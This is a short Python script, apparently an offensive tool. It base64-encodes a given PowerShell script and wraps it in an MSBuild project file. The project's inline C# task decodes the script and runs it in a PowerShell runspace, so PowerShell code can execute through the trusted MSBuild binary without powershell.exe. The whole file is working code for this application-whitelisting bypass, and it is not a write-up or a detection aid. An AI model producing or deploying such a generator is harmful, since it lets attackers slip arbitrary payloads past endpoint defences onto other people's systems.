import sys
import base64

if (len(sys.argv)<2):
    print ("Usage: " + sys.argv[0] + " Script.ps1")
    exit

data = open(sys.argv[1], "r").read()
script = base64.b64encode(data)

code ="<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">"
code += "<Target Name=\"Example\">"
code += "<ClassExample />"
code += "</Target>"
code += "<UsingTask "
code += "TaskName=\"ClassExample\" "
code += "TaskFactory=\"CodeTaskFactory\" "
code += "AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >"
code += "<Task>"
code += "<Reference Include=\"System.Management.Automation\" />"
code += "<Using Namespace=\"System\" />"
code += "<Using Namespace=\"System.IO\" />"
code += "<Using Namespace=\"System.Reflection\" />"
code += "<Using Namespace=\"System.Collections.Generic\" />"
code += "<Code Type=\"Class\" Language=\"cs\">"
code += "<![CDATA[ "
code += "using System;"
code += "using System.IO;"
code += "using System.Diagnostics;"
code += "using System.Reflection;"
code += "using System.Runtime.InteropServices;"
code += "using System.Collections.ObjectModel;"
code += "using System.Management.Automation;"
code += "using System.Management.Automation.Runspaces;"
code += "using System.Text;"
code += "using Microsoft.Build.Framework;"
code += "using Microsoft.Build.Utilities;"
code += "public class ClassExample :  Task, ITask"
code += "{"
code += "public override bool Execute()"
code += "{"
code += "byte[] data = Convert.FromBase64String(\""+script+"\");string script = Encoding.Default.GetString(data);"
#code += "string script = \"[System.Text.Encoding]::Default.GetString([System.Convert]::FromBase64String('"+script+"')) | iex\";"
code += "PSExecute(script);"
code += "return true;"
code += "}"
code += "public static void PSExecute(string cmd)"
code += "{"
code += "Runspace runspace = RunspaceFactory.CreateRunspace();"
code += "runspace.Open();"
code += "Pipeline pipeline = runspace.CreatePipeline();"
code += "pipeline.Commands.AddScript(cmd);"
code += "pipeline.InvokeAsync();"
code += "}"
code += "}"
code += " ]]>"
code += "</Code>"
code += "</Task>"
code += "</UsingTask>"
code += "</Project>"

print(code)